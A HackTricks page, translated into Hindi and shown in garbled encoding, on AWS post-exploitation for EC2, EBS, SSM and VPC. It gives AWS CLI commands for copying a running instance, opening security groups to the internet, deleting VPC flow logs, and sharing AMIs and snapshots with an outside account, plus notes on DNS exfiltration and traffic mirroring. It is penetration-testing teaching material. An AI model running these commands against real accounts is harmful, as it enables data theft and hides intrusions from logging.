# AWS - EC2, EBS, SSM & VPC рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>

## EC2 & VPC

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг VPC рдорд┐рд░рд░**

VPC рдЯреНрд░реИрдлрд┐рдХ рдорд┐рд░рд░рд┐рдВрдЧ **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХреЗ рдЗрдирдмрд╛рдЙрдВрдб рдФрд░ рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЯреНрд░реИрдлрд┐рдХ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рддреА рд╣реИ рдЬреЛ VPC рдХреЗ рднреАрддрд░ рд╣реЛрддреА рд╣реИ**, рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдкрд░ рдХреБрдЫ рднреА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдмрд┐рдирд╛ред рдпрд╣ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдЯреНрд░реИрдлрд┐рдХ рдЖрдорддреМрд░ рдкрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯреНрд░реВрдЬрди рдбрд┐рдЯреЗрдХреНрд╢рди рд╕рд┐рд╕реНрдЯрдо (IDS) рдЬреИрд╕реА рдЪреАрдЬрд╝реЛрдВ рдХреЛ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИред\
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### рдЪрд▓ рд░рд╣реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдПрдВ

рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВред рдЕрдВрджрд░ рдЬрд╛рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ (рджреЗрдЦреЗрдВ [EC2 рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдЯреНрд░рд┐рдХреНрд╕](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md))ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдХрд┐ рдЗрд╕рдореЗрдВ рдХреНрдпрд╛ рд╣реИ, рд╡рд╣ рд╣реИ **рдПрдХ AMI рдмрдирд╛рдирд╛ рдФрд░ рдЙрд╕рд╕реЗ рдПрдХ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдирд╛ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЖрдкрдХреЗ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рднреА)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS рд╕реНрдиреИрдкрд╢реЙрдЯ рдбрдВрдк

**рд╕реНрдиреИрдкрд╢реЙрдЯреНрд╕ рд╡реЙрд▓реНрдпреВрдореНрд╕ рдХреЗ рдмреИрдХрдЕрдк рд╣реЛрддреЗ рд╣реИрдВ**, рдЬрд┐рдирдореЗрдВ рдЖрдорддреМрд░ рдкрд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рдЬрд╛рдВрдЪрдиреЗ рд╕реЗ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред\
рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ **рд╡реЙрд▓реНрдпреВрдо рдмрд┐рдирд╛ рд╕реНрдиреИрдкрд╢реЙрдЯ рдХреЗ** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк: **рд╕реНрдиреИрдкрд╢реЙрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдмрд╕ **рдЗрд╕реЗ рдЦрд╛рддреЗ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### рдбреЗрдЯрд╛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди

#### DNS рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ рдЖрдк рдПрдХ EC2 рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд▓реЙрдХ рдХрд░ рджреЗрддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ рдЯреНрд░реИрдлрд┐рдХ рдмрд╛рд╣рд░ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛, рддреЛ рднреА рдпрд╣ **DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдлрд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

* **VPC рдлреНрд▓реЛ рд▓реЙрдЧреНрд╕ рдЗрд╕реЗ рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ**ред
* рдЖрдкрдХреЗ рдкрд╛рд╕ AWS DNS рд▓реЙрдЧреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИред
*   рдЗрд╕реЗ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "enableDnsSupport" рдХреЛ false рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API рдХреЙрд▓реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЦрд╛рддреЗ рдХреЗ API рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред Cloudtrail рдЗрди рдХреЙрд▓реНрд╕ рдХреЛ рд▓реЙрдЧ рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ Cloudtrail рд▓реЙрдЧреНрд╕ рдореЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдбреЗрдЯрд╛ рджреЗрдЦ рдкрд╛рдПрдЧрд╛ред

### рдУрдкрди рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЧреНрд░реБрдк

рдЖрдк рдЗрд╕ рддрд░рд╣ рд╕реЗ рдкреЛрд░реНрдЯреНрд╕ рдЦреЛрд▓рдХрд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдЖрдЧреЗ рдХреА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### SSM рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### ECS рдореЗрдВ Privesc

EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдЪрд▓рд╛рдирд╛ рдФрд░ рдЙрд╕реЗ ECS рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдлрд┐рд░ ECS рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХрд╛ рдбреЗрдЯрд╛ рдЪреБрд░рд╛рдирд╛ред

[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдпрд╣ рджреЗрдЦреЗрдВ**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### VPC рдлреНрд▓реЛ рд▓реЙрдЧреНрд╕ рд╣рдЯрд╛рдПрдВ
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMI рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS рд╕реНрдиреИрдкрд╢реЙрдЯ рд╢реЗрдпрд░ рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
